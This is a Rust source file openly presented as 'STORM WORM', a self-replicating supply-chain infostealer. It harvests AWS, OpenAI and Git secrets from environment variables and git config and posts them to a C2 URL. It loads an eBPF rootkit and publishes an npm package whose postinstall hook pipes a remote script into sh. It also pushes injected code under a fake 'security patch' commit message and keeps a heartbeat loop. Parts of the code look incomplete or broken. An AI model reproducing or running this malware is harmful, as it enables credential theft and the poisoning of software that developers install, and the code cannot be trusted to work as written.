// STORM WORM: Zero-Day Supply-Chain Worm (Rust)
// Self-replicating, kernel-level infostealer with eBPF rootkit.

#![feature(asm)]
#![feature(naked_functions)]
use std::{
    env, fs, io,
    process::Command,
    thread,
    time::Duration,
};
use reqwest::blocking::Client;
use serde_json::json;
use libbpf_rs::Program;

// --- CONFIGURATION ---
const C2_SERVER: &str = "https://your-c2-server.com/exfil";
const MALICIOUS_REPO: &str = "https://github.com/your-malicious-repo/storm_worm.git";
const EBPF_ROOTKIT: &[u8] = include_bytes!("rootkit.o");

// --- ENVIRONMENT THEFT ---
fn steal_environment() -> String {
    let env_vars = env::vars()
        .filter(|(k, _)| k.contains("AWS") || k.contains("OPENAI") || k.contains("GIT"))
        .map(|(k, v)| format!("{}={}", k, v))
        .collect::<Vec<_>>()
        .join("\n");
    exfiltrate("env", &env_vars);
    env_vars
}

// --- GIT CREDENTIAL THEFT ---
fn steal_git_credentials() -> String {
    let git_config = Command::new("git")
        .args(&["config", "--list"])
        .output()
        .unwrap()
        .stdout;
    let git_creds = String::from_utf8_lossy(&git_config);
    exfiltrate("git", &git_creds);
    git_creds.to_string()
}

// --- EBPF ROOTKIT INJECTION ---
fn inject_ebpf_rootkit() {
    let mut program = Program::load(EBPF_ROOTKIT).unwrap();
    program.attach().unwrap();
    println!("[+] eBPF rootkit injected");
}

// --- SELF-REPLICATION ---
fn replicate_to_npm() {
    // Create malicious npm package
    fs::create_dir_all("storm_worm").unwrap();
    fs::write(
        "storm_worm/package.json",
        r#"{
            "name": "storm_worm",
            "version": "1.0.0",
            "main": "index.js",
            "scripts": { "postinstall": "curl -s https://your-malicious-server.com/storm_worm | sh" }
        }"#,
    ).unwrap();

    // Publish to npm
    Command::new("npm")
        .args(&["publish", "storm_worm"])
        .status()
        .unwrap();
    println!("[+] Self-replicated to npm");
}

// --- BACK-COMMIT TO REPOSITORIES ---
fn back_commit_to_repos() {
    // Clone victim's private repos
    Command::new("git")
        .args(&["clone", MALICIOUS_REPO])
        .status()
        .unwrap();

    // Inject malicious Rust code
    fs::write(
        "storm_worm/src/lib.rs",
        r#"
            pub fn exploit() {
                println!("STORM WORM ACTIVATED");
            }
        "#,
    ).unwrap();

    // Commit and push
    Command::new("git")
        .args(&["add", "."])
        .status()
        .unwrap();
    Command::new("git")
        .args(&["commit", "-m", "fix: security patch"])
        .status()
        .unwrap();
    Command::new("git")
        .args(&["push"])
        .status()
        .unwrap();
    println!("[+] Back-committed to repositories");
}

// --- EXFILTRATION ---
fn exfiltrate(data_type: &str, data: &str) {
    let client = Client::new();
    let payload = json!({
        "type": data_type,
        "data": data,
        "timestamp": chrono::Utc::now().to_rfc3339(),
    });
    let _ = client.post(C2_SERVER)
        .json(&payload)
        .send();
}

// --- MAIN ---
fn main() {
    println!("[+] STORM WORM ACTIVATED");

    // Steal environment variables
    steal_environment();

    // Steal Git credentials
    steal_git_credentials();

    // Inject eBPF rootkit
    inject_ebpf_rootkit();

    // Self-replicate to npm
    replicate_to_npm();

    // Back-commit to repositories
    back_commit_to_repos();

    // Persist
    loop {
        thread::sleep(Duration::from_secs(3600));
        exfiltrate("heartbeat", "STORM WORM ALIVE");
    }
}